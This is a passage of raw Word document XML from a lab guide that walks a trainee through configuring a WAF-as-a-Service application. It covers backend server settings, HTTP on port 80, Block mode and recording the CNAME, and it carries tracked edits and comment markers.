        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Backend Server </w:t>
      </w:r>
      <w:r w:rsidRPr="00C93511">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Domain Name</w:t>
      </w:r>
      <w:r w:rsidR="53CA7C6E" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> from the email you received</w:t>
      </w:r>
      <w:r w:rsidR="00A769F0">
        <w:t>, for example backendserver</w:t>
      </w:r>
      <w:r w:rsidR="00C93511">
        <w:t xml:space="preserve">XXXXXXXX.eastus2.azurecontainer.io </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B4EFCC" w14:textId="5892EDC5" w:rsidR="077BE973" w:rsidRDefault="077BE973" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>Click Continue.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7FB441" w14:textId="3DEED185" w:rsidR="077BE973" w:rsidRPr="005824FB" w:rsidRDefault="00F54EB4" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>U</w:t>
      </w:r>
      <w:r w:rsidR="005A466C" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidR="00A20044" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>check</w:t>
      </w:r>
      <w:r w:rsidR="00A20044" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTPS</w:t>
      </w:r>
      <w:r w:rsidR="00A20044">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005A466C">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="005A466C" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>uncheck</w:t>
      </w:r>
      <w:r w:rsidR="005A466C" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Redirect HTTP to HTTPS</w:t>
      </w:r>
      <w:r w:rsidR="00D845BF" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="005A466C" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="077BE973">
        <w:t xml:space="preserve">and click </w:t>
      </w:r>
      <w:r w:rsidR="077BE973" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Continue </w:t>
      </w:r>
      <w:r w:rsidR="00D845BF">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="13A42D24" wp14:editId="7EC9F943">
            <wp:extent cx="2764186" cy="1786434"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="1449851363" name="Picture 144985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4186" cy="1786434"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B6DB86" w14:textId="7F5306FC" w:rsidR="005824FB" w:rsidRDefault="005824FB" w:rsidP="001B0AEF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="003C2068">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>NOTE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">In a real deployment </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">we would use HTTPS for encryption.  </w:t>
      </w:r>
      <w:r w:rsidR="00642E0D">
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>e are skipping this part</w:t>
      </w:r>
      <w:r w:rsidR="00642E0D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E2CA1D" w14:textId="77777777" w:rsidR="005824FB" w:rsidRDefault="005824FB" w:rsidP="001B0AEF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59FAB231" w14:textId="2F6C8FD7" w:rsidR="00E32BFC" w:rsidRPr="00E32BFC" w:rsidRDefault="077BE973" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">On the next screen, for the Backend Server, </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18" w:rsidRPr="55E0BB2E">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> resolves the IP for </w:t>
      </w:r>
      <w:r w:rsidR="00A62FE0">
        <w:t>the domain name</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">.  Change the protocol from HTTPS to the </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">protocol, </w:t>
      </w:r>
      <w:del w:id="12" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r w:rsidRPr="55E0BB2E" w:rsidDel="077BE973">
          <w:delText>Select</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="13" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r w:rsidR="445FC132" w:rsidRPr="55E0BB2E">
          <w:t>select</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> port </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">80, </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Test Connection, </w:t>
      </w:r>
      <w:r w:rsidR="00E32BFC" w:rsidRPr="00E32BFC">
        <w:t>then</w:t>
      </w:r>
      <w:r w:rsidR="00E32BFC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E32BFC">
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">lick </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50369E70" w14:textId="5E29C8AE" w:rsidR="077BE973" w:rsidRDefault="077BE973" w:rsidP="00E32BFC">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00ED15F9">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3C114F15" wp14:editId="45366FB2">
            <wp:extent cx="2680364" cy="1800762"/>
            <wp:effectExtent l="0" t="0" r="5715" b="9525"/>
            <wp:docPr id="1449851364" name="Picture 144985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0364" cy="1800762"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F5F30C6" w14:textId="77777777" w:rsidR="00236697" w:rsidRPr="00236697" w:rsidRDefault="077BE973" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">On the Select Mode step, select </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Block </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">and click </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add</w:t>
      </w:r>
      <w:ins w:id="14" w:author="Brett" w:date="2021-05-07T14:49:00Z">
        <w:r w:rsidR="7BB21826" w:rsidRPr="55E0BB2E">
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve">. </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="7BB21826" w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E77B6B2" w14:textId="6A1B2B76" w:rsidR="077BE973" w:rsidRPr="00236697" w:rsidRDefault="7BB21826" w:rsidP="00236697">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="QuoteChar"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>Note</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="QuoteChar"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: in an actual deployment, you would start with Monitor </w:t>
      </w:r>
      <w:r w:rsidR="31CC9C93" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="QuoteChar"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>mode first, to check for any false positives before</w:t>
      </w:r>
      <w:r w:rsidR="002E0172" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="QuoteChar"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> switching to</w:t>
      </w:r>
      <w:r w:rsidR="31CC9C93" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="QuoteChar"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> blocking.</w:t>
      </w:r>
      <w:del w:id="15" w:author="Brett" w:date="2021-05-07T14:48:00Z">
        <w:r w:rsidR="077BE973">
          <w:rPr>
            <w:noProof/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E346B06" wp14:editId="2D60BC07">
              <wp:extent cx="3673412" cy="2608122"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:docPr id="1810709465" name="Picture 181070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7094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3412" cy="2608122"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0EB79D18" w14:textId="47B2BCA1" w:rsidR="077BE973" w:rsidRDefault="077BE973" w:rsidP="00172641">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="604D2E0C" w14:textId="0CAB842D" w:rsidR="077BE973" w:rsidRDefault="077BE973" w:rsidP="00A424D9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:after="240"/>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:lastRenderedPageBreak/>
        <w:t>On the next screen, it will tell you to change the DNS record</w:t>
      </w:r>
      <w:r w:rsidR="3B3F48E4" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> of your site</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="5D5CD2DB" w:rsidRPr="55E0BB2E">
        <w:t>but</w:t>
      </w:r>
      <w:r w:rsidR="2A6E7D14" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> doing th</w:t>
      </w:r>
      <w:r w:rsidR="00E32BFC">
        <w:t xml:space="preserve">is DNS </w:t>
      </w:r>
      <w:r w:rsidR="2A6E7D14" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">change is outside the scope </w:t>
      </w:r>
      <w:r w:rsidR="00733C1E">
        <w:t xml:space="preserve">for </w:t>
      </w:r>
      <w:r w:rsidR="2A6E7D14" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">this </w:t>
      </w:r>
      <w:r w:rsidR="00733C1E">
        <w:t>lesson</w:t>
      </w:r>
      <w:r w:rsidR="003E2D93">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="004A793F">
        <w:t xml:space="preserve"> so you do not have to do that.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560863B7" w14:textId="4C8EC978" w:rsidR="077BE973" w:rsidRDefault="00733C1E" w:rsidP="00A424D9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:after="240"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Instead, </w:t>
      </w:r>
      <w:r w:rsidRPr="007B3BC3">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">make </w:t>
      </w:r>
      <w:r w:rsidR="077BE973" w:rsidRPr="007B3BC3">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>a note of the domain name</w:t>
      </w:r>
      <w:r w:rsidR="077BE973" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> under </w:t>
      </w:r>
      <w:r w:rsidR="077BE973" w:rsidRPr="004A793F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CHANGE CNAME TO</w:t>
      </w:r>
      <w:r w:rsidR="077BE973" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="3605685C" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">we will be referring to this as your </w:t>
      </w:r>
      <w:r w:rsidR="007B3BC3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="3605685C" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> throughout this training.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE6F23A" w14:textId="15E75D8A" w:rsidR="077BE973" w:rsidRDefault="7B02A5BB" w:rsidP="00A424D9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:after="240"/>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="077BE973" w:rsidRPr="55E0BB2E">
        <w:t>lick</w:t>
      </w:r>
      <w:r w:rsidR="6C40B9C1" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0F8F8A2B" w:rsidRPr="00B133D3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="077BE973" w:rsidRPr="00B133D3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>lose</w:t>
      </w:r>
      <w:r w:rsidR="077BE973" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E333850" w14:textId="44CCA6EC" w:rsidR="077BE973" w:rsidRDefault="077BE973" w:rsidP="00733C1E">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AB7AFB">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2636B74F" wp14:editId="0B8B8806">
            <wp:extent cx="2811321" cy="2044160"/>
            <wp:effectExtent l="0" t="0" r="8255" b="0"/>
            <wp:docPr id="1449851365" name="Picture 144985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1321" cy="2044160"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="090E0691" w14:textId="7E54A62E" w:rsidR="006D3634" w:rsidRDefault="006D3634" w:rsidP="006D3634">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You will see an "Updating Configuration” message indicating your WAF-as-a-Service application is being </w:t>
      </w:r>
      <w:del w:id="16" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r w:rsidDel="406CDF80">
          <w:delText>provisioned</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="17" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r>
          <w:t>provisioned.</w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> Note that in most cases, this will take less than a minute, but could take up to five minutes. </w:t>
      </w:r>
      <w:commentRangeStart w:id="18"/>
      <w:commentRangeEnd w:id="18"/>
      <w:r>
        <w:commentReference w:id="18"/>
      </w:r>
      <w:r w:rsidR="003E2D93" w:rsidRPr="003E2D93">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003E2D93">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidR="003E2D93" w:rsidRPr="003E2D93">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>OK</w:t>
      </w:r>
      <w:r w:rsidR="003E2D93">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00BD7AD8">
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidR="00BD7AD8" w:rsidRPr="00BD7AD8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Close</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A1E8DB0" w14:textId="77777777" w:rsidR="006D3634" w:rsidRDefault="006D3634" w:rsidP="006D3634">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="012E8ECE" wp14:editId="0D238D10">
            <wp:extent cx="2714625" cy="1845945"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1945875345" name="Picture 194587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8753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4625" cy="1845945"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A9173A4" w14:textId="77777777" w:rsidR="006D3634" w:rsidRDefault="006D3634" w:rsidP="00733C1E">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A0B5296" w14:textId="1F0E4652" w:rsidR="077BE973" w:rsidRDefault="077BE973" w:rsidP="00172641">
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC1A067" w14:textId="6BA0CBF4" w:rsidR="50C40F79" w:rsidRDefault="50C40F79" w:rsidP="00172641"/>
    <w:p w14:paraId="30F82389" w14:textId="6DDB915E" w:rsidR="50C40F79" w:rsidRDefault="50C40F79" w:rsidP="00172641"/>
    <w:p w14:paraId="33CFC579" w14:textId="77777777" w:rsidR="007B3BC3" w:rsidRDefault="007B3BC3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc196026627"/>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DDF0EC" w14:textId="45FDC733" w:rsidR="2CB00A22" w:rsidRPr="008A0072" w:rsidRDefault="2CB00A22" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc72791967"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Test your </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Application</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="5C2C0607" w14:textId="6753FED1" w:rsidR="406CDF80" w:rsidRDefault="2E4B6A22" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You </w:t>
      </w:r>
      <w:r w:rsidR="3B115BB5">
        <w:t xml:space="preserve">should now be on the </w:t>
      </w:r>
      <w:r w:rsidR="3B115BB5" w:rsidRPr="00F41D71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Endpoints</w:t>
      </w:r>
      <w:r w:rsidR="3B115BB5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C979CE">
        <w:t>component</w:t>
      </w:r>
      <w:r w:rsidR="3B115BB5">
        <w:t xml:space="preserve"> of WAF-as-a-Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEF7763" w14:textId="77777777" w:rsidR="00C82D21" w:rsidRDefault="3B115BB5" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note: </w:t>
      </w:r>
      <w:r w:rsidR="406CDF80">
        <w:t xml:space="preserve">Because we </w:t>
      </w:r>
      <w:r w:rsidR="00BD7AD8">
        <w:t>skipped</w:t>
      </w:r>
      <w:r w:rsidR="1A55A00B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="406CDF80">
        <w:t>the DNS</w:t>
      </w:r>
      <w:r w:rsidR="25BA9307">
        <w:t xml:space="preserve"> changes </w:t>
      </w:r>
      <w:r w:rsidR="406CDF80">
        <w:t xml:space="preserve">for this </w:t>
      </w:r>
      <w:r w:rsidR="5DDC5A05">
        <w:t>Test Drive</w:t>
      </w:r>
      <w:r w:rsidR="406CDF80">
        <w:t xml:space="preserve">, you will see “DNS Update Pending” and this is </w:t>
      </w:r>
      <w:del w:id="21" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r w:rsidR="406CDF80" w:rsidDel="406CDF80">
          <w:delText>normal</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="22" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r w:rsidR="25EB67A4">
          <w:t>expected</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="406CDF80">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00F41D71">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A76DBAE" w14:textId="121AF17F" w:rsidR="6CF32ED4" w:rsidRDefault="00F41D71" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We </w:t>
      </w:r>
      <w:r w:rsidR="406CDF80">
        <w:t xml:space="preserve">will be using the </w:t>
      </w:r>
      <w:commentRangeStart w:id="23"/>
      <w:commentRangeStart w:id="24"/>
      <w:commentRangeStart w:id="25"/>
      <w:r w:rsidR="4DEA9A18" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidR="191F7277" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:commentRangeEnd w:id="23"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="23"/>
      </w:r>
      <w:commentRangeEnd w:id="24"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="24"/>
      </w:r>
      <w:commentRangeEnd w:id="25"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="25"/>
      </w:r>
      <w:r w:rsidR="4411C059" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="4411C059">
